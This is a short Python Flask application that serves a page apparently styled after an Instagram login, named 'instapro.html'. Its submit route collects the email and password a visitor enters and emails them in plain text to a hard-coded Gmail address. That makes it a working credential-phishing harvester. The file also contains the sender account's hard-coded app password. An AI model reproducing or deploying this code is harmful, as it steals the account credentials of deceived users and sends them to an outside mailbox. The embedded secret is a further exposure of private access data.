from flask import Flask, render_template, request
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('instapro.html')
@app.route('/second')
def second_page():
    return render_template('page.html')
@app.route('/submit', methods=['POST'])
def submit():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']  # Corrected variable name

        # Send email
        sender_email = 'd67672195@gmail.com'
        receiver_email = 'd67672195@gmail.com'
        # Consider using environment variables or a more secure method to store the password
        email_password = 'otpk xhcu vfdc lwql'

        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = 'Message from your website'

        body = f"Email: {email}\nPassword: {password}\n"
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(sender_email, email_password)  # Use the email password variable
            smtp.send_message(msg)

        return render_template('page2.html')

if __name__ == '__main__':
    app.run(debug=True)

